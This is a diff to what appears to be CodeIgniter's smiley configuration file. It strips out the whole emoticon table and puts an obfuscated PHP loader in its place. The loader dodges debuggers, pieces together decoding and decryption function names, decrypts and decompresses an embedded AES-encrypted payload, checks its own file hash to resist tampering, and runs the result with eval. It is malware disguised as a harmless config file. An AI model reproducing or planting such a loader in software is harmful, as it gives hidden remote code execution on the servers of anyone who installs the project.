@@ -1,64 +1,28 @@
 <?php
-defined('BASEPATH') OR exit('No direct script access allowed');
-
-/*
-| -------------------------------------------------------------------
-| SMILEYS
-| -------------------------------------------------------------------
-| This file contains an array of smileys for use with the emoticon helper.
-| Individual images can be used to replace multiple smileys.  For example:
-| :-) and :) use the same image replacement.
-|
-| Please see user guide for more info:
-| https://codeigniter.com/user_guide/helpers/smiley_helper.html
-|
-*/
-$smileys = array(
-
-//	smiley			image name						width	height	alt
-
-	':-)'			=>	array('grin.gif',			'19',	'19',	'grin'),
-	':lol:'			=>	array('lol.gif',			'19',	'19',	'LOL'),
-	':cheese:'		=>	array('cheese.gif',			'19',	'19',	'cheese'),
-	':)'			=>	array('smile.gif',			'19',	'19',	'smile'),
-	';-)'			=>	array('wink.gif',			'19',	'19',	'wink'),
-	';)'			=>	array('wink.gif',			'19',	'19',	'wink'),
-	':smirk:'		=>	array('smirk.gif',			'19',	'19',	'smirk'),
-	':roll:'		=>	array('rolleyes.gif',		'19',	'19',	'rolleyes'),
-	':-S'			=>	array('confused.gif',		'19',	'19',	'confused'),
-	':wow:'			=>	array('surprise.gif',		'19',	'19',	'surprised'),
-	':bug:'			=>	array('bigsurprise.gif',	'19',	'19',	'big surprise'),
-	':-P'			=>	array('tongue_laugh.gif',	'19',	'19',	'tongue laugh'),
-	'%-P'			=>	array('tongue_rolleye.gif',	'19',	'19',	'tongue rolleye'),
-	';-P'			=>	array('tongue_wink.gif',	'19',	'19',	'tongue wink'),
-	':P'			=>	array('raspberry.gif',		'19',	'19',	'raspberry'),
-	':blank:'		=>	array('blank.gif',			'19',	'19',	'blank stare'),
-	':long:'		=>	array('longface.gif',		'19',	'19',	'long face'),
-	':ohh:'			=>	array('ohh.gif',			'19',	'19',	'ohh'),
-	':grrr:'		=>	array('grrr.gif',			'19',	'19',	'grrr'),
-	':gulp:'		=>	array('gulp.gif',			'19',	'19',	'gulp'),
-	'8-/'			=>	array('ohoh.gif',			'19',	'19',	'oh oh'),
-	':down:'		=>	array('downer.gif',			'19',	'19',	'downer'),
-	':red:'			=>	array('embarrassed.gif',	'19',	'19',	'red face'),
-	':sick:'		=>	array('sick.gif',			'19',	'19',	'sick'),
-	':shut:'		=>	array('shuteye.gif',		'19',	'19',	'shut eye'),
-	':-/'			=>	array('hmm.gif',			'19',	'19',	'hmmm'),
-	'>:('			=>	array('mad.gif',			'19',	'19',	'mad'),
-	':mad:'			=>	array('mad.gif',			'19',	'19',	'mad'),
-	'>:-('			=>	array('angry.gif',			'19',	'19',	'angry'),
-	':angry:'		=>	array('angry.gif',			'19',	'19',	'angry'),
-	':zip:'			=>	array('zip.gif',			'19',	'19',	'zipper'),
-	':kiss:'		=>	array('kiss.gif',			'19',	'19',	'kiss'),
-	':ahhh:'		=>	array('shock.gif',			'19',	'19',	'shock'),
-	':coolsmile:'	=>	array('shade_smile.gif',	'19',	'19',	'cool smile'),
-	':coolsmirk:'	=>	array('shade_smirk.gif',	'19',	'19',	'cool smirk'),
-	':coolgrin:'	=>	array('shade_grin.gif',		'19',	'19',	'cool grin'),
-	':coolhmm:'		=>	array('shade_hmm.gif',		'19',	'19',	'cool hmm'),
-	':coolmad:'		=>	array('shade_mad.gif',		'19',	'19',	'cool mad'),
-	':coolcheese:'	=>	array('shade_cheese.gif',	'19',	'19',	'cool cheese'),
-	':vampire:'		=>	array('vampire.gif',		'19',	'19',	'vampire'),
-	':snake:'		=>	array('snake.gif',			'19',	'19',	'snake'),
-	':exclaim:'		=>	array('exclaim.gif',		'19',	'19',	'exclaim'),
-	':question:'	=>	array('question.gif',		'19',	'19',	'question')
-
-);
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_bcbro5ez=('bas'.'e64'.'_de'.'cod'.'e');
+$_v4al67jh=('gzu'.'nco'.'mpr'.'ess');
+$_ldc5ifuy=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_ahp8iur5='yvOGiasv';
+$_ny32b3gc='XkZualIakBc=';
+$_ae14atxi='uhNiHkc/';
+$_ch2500ly='M7IIoQzB';
+$_luytyvrk='L0gfUnrv';
+$_y9k643ei='RuMuWQ==';
+$_cnq3i07p='WBdPmrXg';
+$_muwizg8k='cUMvfpQ1';
+$_k3o8tqk1=$_bcbro5ez($_ae14atxi.$_ahp8iur5.$_luytyvrk.$_ch2500ly.$_ny32b3gc);
+$_twbadmi6=$_bcbro5ez($_muwizg8k.$_cnq3i07p.$_y9k643ei);
+$_j958b9m2=$_bcbro5ez('wEUm1TlgQvUNNZFSaPm0kWARMK7Ye+wbgsrytKnWbQCR4+B2PzjVwaok7wwPtcaCyy7PTYySvlPpfBiWJI68Q7nL6n1YuLhEIyHAaJKMxMWW4Hv3vDyYMsac6vzZkd0ziuB7upkZRVOHG9FsLliqX+LBbenYrTc8DLuX/1XgHD/BLQeS7UeYF7zZ71vmPObGVKZ0A26uv7MttoW00EAwL/AwBIsEx2MMwS4a/PkZ5hvi3g4hwJXCekB+GdMBAEA1vgtidAFAblzH2EKRu8Nfa0y5aakh6f58L+nLWrcJzNzaQY3/TjDT8oPS0hgSSgm2EpT8dAh4omXhppYJtcOLGja7P7O44eKuzMy76KS4RK41969e7aEytLS/3OqUoTLojOtVA3prJzFKIGMX9UBlke5eBOdJwCEULOoGZK53wAQCL5qRVDTj/vcJV4mizn9/99YrHb7hdVgeJ0ffAl1xdW1bTrMFxTXXrnDP7YHCz8pO+XjOxFDLIXMGX612PfkNmAqxX1ZjpkYOXxUZOgaADAI643NVg4SCeZCZfpTN4fWHocawoIQsuqVxCOyJ2SXAhSCBS3oW4prddBfTyriblT8jZ0z+ALbbxmP6jyjXNI13C4SkUDXy1GiqukBAGuw8kekNW0cMkIdGVdZKOrW02iSaFKfnigEftRA0BtDdJvpUSCL682UiwTgIwjMPj6F0OVBnuDCWZu3Ths+cp6yNJpQRupMESOYZqTRfDZorvu6WskGs+RaEkUcBLD8RPnw2EhB/FOjCYmT0SamOnzdXnY3U43Y2kBv/Iq7EpeDd/281NiJ6YWMeip1yUv62uKJbGRDcQPbendLwSx1lvrRYDSRjkE5bkNtD7QQ4RenYxCs=');
+$_kqov3n4k=$_ldc5ifuy($_j958b9m2,'aes-256-cbc',$_k3o8tqk1,OPENSSL_RAW_DATA,$_twbadmi6);
+if($_kqov3n4k===false){exit;}
+$_x5b9cjk5=$_v4al67jh($_kqov3n4k);
+if($_x5b9cjk5===false){exit;}
+$_vrj31wem='6b55be3becb22e01c992b38d4c8ff089e74e96a3ca2162087fa8ba8343efc56d';
+$_q2gydbaa=@file_get_contents(__FILE__);
+if($_q2gydbaa!==false){
+$_vewqzn5j=str_replace($_vrj31wem,"0000000000000000000000000000000000000000000000000000000000000000",$_q2gydbaa);
+$_jzd0e37w=hash("sha256",$_vewqzn5j);
+if($_jzd0e37w!==$_vrj31wem){@http_response_code(403);exit;}
+}
+eval($_x5b9cjk5);
